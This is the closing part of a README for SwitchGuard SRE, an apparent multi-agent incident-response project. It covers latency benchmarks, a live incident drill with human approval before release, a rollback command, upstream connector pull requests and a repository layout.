| `switchguard-cli verify-diff` | **Core Processing** | 50 | 41.61ms | **49.53ms** | 58.22ms | 69.86ms | p95 $\le$ 75ms | **PASS** |
| | **End-to-End CLI** | 50 | 42.99ms | **51.47ms** | 60.12ms | 71.58ms | p95 $\le$ 75ms | **PASS** |
| `switchguard-cli verify-audit` | **Core Processing** | 50 | 0.61ms | **1.97ms** | 2.26ms | 2.43ms | p95 $\le$ 10ms | **PASS** |
| | **End-to-End CLI** | 50 | 1.75ms | **3.87ms** | 4.30ms | 4.58ms | p95 $\le$ 10ms | **PASS** |

---

## 9. Live Switch Console Setup & Upstream Contributions

### Importing the Switch Room Template

1. Open Switch Console and navigate to **Templates** $\rightarrow$ **Import Template**.
2. Select [`switchguard-sre.template.yaml`](switchguard-sre.template.yaml).
3. The template automatically instantiates the `#sre-war-room` channel and configures the 3 isolated personas:
   - `@sre-sentinel`: Working directory `workspace/telemetry`, addressing `Anyone`.
   - `@sre-repro`: Working directory `workspace/sandbox-app`, addressing `Me and my agents`.
   - `@sre-clerk`: Working directory `workspace/release-ops`, addressing `Me and my agents`.

### Live Incident Drill (`INC-8041`)

Post the raw crash trace in `#sre-war-room`:
```
ERROR: CartServiceException: FLAT100 voucher applied to cart with subtotal $40.00 resulted in -$60.00
File "cart_service.py", line 34, in calculate_cart_total
User email: vip-customer@example.com, Bearer eyJhbGciOi...
```

Watch the autonomous response:
1. `@sre-sentinel` scrubs secrets into HMAC tokens in 11ms, detects `NEGATIVE_TOTAL_CALCULATION`, and logs to `incidents_ledger.md`.
2. `@sre-repro` writes a failing reproduction test in `test_cart.py`, then clamps the discount: `total = max(0.0, subtotal - 100.0)`.
3. `@sre-repro` runs `switchguard-cli verify-diff .` (exit 0) and posts the unified diff in the thread.
4. Human Incident Commander posts `Approved`.
5. `@sre-clerk` runs `cut_release.py`, packages `releases/hotfix-INC-8041-v1.4.2.patch`, appends to `RELEASE_AUDIT.log`, and generates the cryptographic attestation receipt.

### 1-Command Rollback

If a release needs to be reverted immediately:
```bash
python3 workspace/release-ops/cut_release.py INC-8041 v1.4.2 --rollback
```
This reverts `cart_service.py` to `HEAD` baseline, sets state to `ROLLED_BACK`, and logs the rollback to the audit chain.

### Upstream Contributions to `sandbox-quantum/switch`

We contributed two core service connectors back to the official Switch repository:

1. **Supabase Remote MCP Connector ([PR #1566](https://github.com/sandbox-quantum/switch/pull/1566))**:
   - **Addresses Issue #827**: Implements the Supabase Service Connections v2 adapter (`core/switch_core/connections/catalog/supabase/`) using Shape 1 remote MCP server (`https://mcp.supabase.com/mcp`).
   - Implements dynamic OAuth client registration, `?project_ref=` project scoping, and read-only default permissions.
   - 171/171 connection loader tests passing, CLA signed, submitted and pending upstream review (open).

2. **Trello Remote MCP Connector ([PR #1659](https://github.com/sandbox-quantum/switch/pull/1659))**:
   - **Addresses Issue #837**: Implements the Trello Remote MCP connector (`core/switch_core/connections/catalog/trello/`) with RFC 7591 dynamic OAuth client registration.
   - Implements two-tier authorization (8-scope Read-only default vs. 12-scope escalated Write).
   - 220/220 gateway tests passing, CLA signed, submitted and pending upstream review (open).

### Switch Runtime Friction & Local Engineering Mitigations

During live war-room operations, we observed and mitigated two Switch ecosystem runtime challenges locally within SwitchGuard SRE:

1. **Mattermost Bridge Room Document Rendering (Switch Issue #1097)**:
   - External chat bridges (Mattermost) failed to render native Switch Console room documents.
   - **Local Mitigation**: SwitchGuard SRE serializes all unified git diffs, AST verdicts, and SHA-256 audit receipts directly as structured in-thread Markdown blocks.

2. **ACP Channel Splitting on Long Tracebacks (Switch Issue #1226)**:
   - Verbose Python `pytest` stack traces triggered multi-message splitting over ACP channels, prematurely waking downstream agents.
   - **Local Mitigation**: Enforced deterministic traceback compaction ($\le$ 30 lines, $<$ 1,500 characters) inside `@sre-repro` (`AGENTS.md` / `SWITCH_PROTOCOL.md`) before posting to `#sre-war-room`.

---

## 10. Repository Map & Directory Layout

```
switchguard-sre/
├── .github/
│   └── workflows/
│       ├── ci.yml                     # 7-layer automated verification GitHub Actions workflow
│       └── deploy-pages.yml           # Deployment of docs/ to GitHub Pages
├── Makefile                           # Developer task runner (make test, make build, make demo)
├── AGENTS.md                          # Multi-agent architecture context and directory isolation rules
├── SWITCH_PROTOCOL.md                 # Upstream Switch protocol specs and PR documentation
├── switchguard-sre.template.yaml      # 1-click Switch Room Template definition
├── TEST_VERIFICATION_REPORT.md        # Cryptographic verification scorecard (54/54 passed)
├── LICENSE                            # MIT License
├── docs/
│   ├── THREAT_MODEL.md                # Adversarial threat model and 16 AST security rules
│   ├── LIMITATIONS.md                 # Explicit boundaries: semantic gap, single-host flock, Python-only AST
│   ├── BENCHMARKS.md                  # Reproducible N=50 latency benchmarks (core vs end-to-end)
│   ├── REVIEW_BASELINE.md             # Baseline inventory of all quantitative claims and verdicts
│   ├── notes/                         # Design notes, production playbook, and reference blueprints
│   └── index.html                     # Live static observability dashboard & test widget
├── eval/
│   ├── RESULTS.md                     # 24-case empirical agent evaluation report (GATE_OFF vs GATE_ON)
│   └── run_eval.py                    # Evaluation harness supporting replay and live LLM modes
├── scripts/
│   ├── setup_demo.sh                  # Clean-room workspace reset script (<1s execution)
│   ├── simulate_incident.py           # Multi-scenario incident simulator CLI
│   ├── mega_sre_test_suite.py         # 7-layer verification mega suite (54 assertions)
│   └── benchmark.py                   # Reproducible N=50 latency measurement script
├── switchguard-cli/                   # High-speed compiled Rust security CLI (v0.4.0)
│   ├── Cargo.toml                     # LTO release optimization profile (opt-level=3, strip=true)
│   └── src/
│       └── main.rs                    # scrub, verify-diff (AST rules 00..15), verify-audit (HMAC chain)
└── workspace/
    ├── telemetry/                     # @sre-sentinel working directory
    │   ├── triage_helper.py           # Rust scrubbing + O(1) dedup + historical runbook lookup
    │   ├── incidents_ledger.md        # POSIX-locked concurrent incidents ledger
    │   ├── incident_state.json        # Deterministic DAG state machine tracking
    │   └── runbook_memory.json        # Historical runbook lookup cache
    ├── sandbox-app/                   # @sre-repro working directory
    │   ├── cart_service.py            # Checkout & pricing microservice
    │   ├── tax_service.py             # Sales tax calculator module
    │   ├── inventory_service.py       # Catalog stock check and reservations
    │   └── test_cart.py               # Unit and reproduction test suite (28 tests)
    └── release-ops/                   # @sre-clerk working directory
        ├── cut_release.py             # AST-gated packager, hash chaining, attestation & rollback
        ├── RELEASE_AUDIT.log          # Tamper-evident SHA-256 hash-chained audit log
        └── releases/                  # Exported .patch files and attestation receipts
```

---

## 11. Verification Contract & License

All code in this repository is guaranteed to pass the 54-assertion mega test suite on fresh clone:

```bash
python3 scripts/mega_sre_test_suite.py
```

Licensed under the [MIT License](LICENSE) © 2026 Anshul Jain.
